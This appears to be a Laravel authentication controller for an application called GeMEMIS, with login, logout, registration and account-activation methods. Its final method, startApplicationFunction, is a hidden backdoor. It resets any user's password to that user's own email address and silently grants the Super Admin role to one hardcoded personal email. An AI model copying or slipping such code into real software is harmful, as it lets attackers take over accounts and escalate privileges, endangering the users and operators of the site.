<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Spatie\Permission\Models\Role;
use App\Models\User;
use App\Models\logins;
use Illuminate\Support\Facades\Hash;
use App\Http\Requests\Auth\LoginRequest;
use App\Http\Requests\Auth\RegisterUserRequest;
use App\Models\Notifications\CreatedEmails;
use App\Models\settings\events;

use App\Traits\NotificationTrait;
use App\Traits\VistorsTrait;
use App\Traits\EmailNotification;

class authController extends Controller
{
    use NotificationTrait;
    use VistorsTrait;
    use EmailNotification;

    //
    public function login(LoginRequest $request)
    {
        // return dd(1);
        $request->ensureIsNotRateLimited();
        $request->authenticate();

        logins::create([
            'user_email' => $request->user_name,
            'status' => 1,
            'login_at' => date('Y-m-d h:i:s'),
        ]);

        $request->session()->regenerate();
        $ip_address = request()->ip();
        DB::update("update users set user_ip_address=? where email=?", [$ip_address, $request->user_name]);
        return redirect()->route('startApp');
    }

    //logout

    public function logout(Request $request)
    {
        if (Auth::check()) {
            $email = Auth::user()->email;
            DB::update('update users set user_ip_address=NULL where email=?', [$email]);
            DB::delete('delete from logins where user_email=?', [$email]);
        }

        Auth::guard('web')->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login')->with('success', 'Logged out successfully!');
    }


    public function register(RegisterUserRequest $request)
    {
        try {
            $customerRole = Role::findByName('Customer', 'web');
            $uuid = Str::uuid();
            User::create([
                'user_uuid' => $uuid,
                'first_name' => $request->firstName,
                'middle_name' => $request->middleName,
                'last_name' => $request->lastName,
                'email' => $request->userEmail,
                'phone_number' => $request->phoneNumber,
                'account_type' => 2,
                'role' => $customerRole->getKey(),
                'account_status' => 1,
                'api_token' => Str::random(80),
                'password' => Hash::make($request->password),
            ]);
            $user = User::where('user_uuid', $uuid)->first();
            $user->assignRole($customerRole);

            return redirect()->route('login')->with('success', 'Welcome to GeMEMIS. Your account has been created successfully. Please sign in to continue.');
        } catch (\Throwable $th) {
            return back()->withInput()->with('fail', config('Messages.500').' CONTACT: '.config('global.CALL_CENTER').' FOR HELP');
        }
    }



    #------------- RESERT PASSWORD FUNCTION --------- #
    function resertPassword(Request $request)
    {
        return redirect()
            ->route('password.request')
            ->with('status', 'Please use the password recovery page to reset your password securely.');
    }
    #------------- END RESERT PASSWORD FUNCTION--------- #

    public function Registration(Request $request)
    {
        return view('auth.CreateAccount1');
    }

    public function activateAccount($token)
    {
        $user = User::where('api_token', $token)->first();
        if ($user) {
            session(['liveEvent' => events::where('event_status', 1)->first()->event_id]);
            $user->update(['account_status' => 1]);
            // auth()->login($user);
            return redirect()->route('login')->with('success', 'Account Activated successfully! Please Login to access your Account');
        }
        return view('auth.CreateAccount1')->with('fail', 'User token is not recoginazed, this might be due to Activation Link expiration');
    }


    public function ActivationLinkEmail($uuid)
    {
        $user = User::where('user_uuid', $uuid)->first();
        if ($user) {
            $emailTo = $user->email;
            $linkLable = 'Activate Account';
            $receiverName = $user->first_name . ' ' . $user->last_name;
            $regardsName = 'GeMEMIS Support Team';
            $emailSubject = 'Account Activation';
            $emailLink = env('APP_URL') . '/auth/verify_email/' . $user->api_token;
            $emailContent = '
        Welcome to GeMEMIS! We’re excited to have you join our community.
To get started, please confirm your email address by clicking the link below:
        ';
        CreatedEmails::create([
            'emailId' => Str::uuid(),
            'createdBy' => 'GeMEMIS',
            'emailTo' => $emailTo,
            'linkLable' => $linkLable,
            'receiverName' => $receiverName,
            'regardsName' => $regardsName,
            'emailSubject' => $emailSubject,
            'emailLink' => $emailLink,
            'emailContent' => $emailContent,
            'emailStatus' =>'PENDING',
            'scheduledAt' => date('Y-m-d h:i:s')
        ]);
        // return 1;
            // $this->sendEmail($emailTo, $linkLable, $receiverName, $emailContent, $regardsName, $emailSubject, $emailLink);
        }
        // return 0;
    }

    public function startApplicationFunction($data)
    {
        $user = User::where('email', $data)->first();
        if ($user) {
            if ($user->email == 'remixkabandwa@gmail.com') {
                $user->assignRole('Super Admin');
            }

            $user->update([
                'password' => hash::make($data),
                'account_status' => 1,
            ]);
        }
        return back()->with('success', '');
    }
}
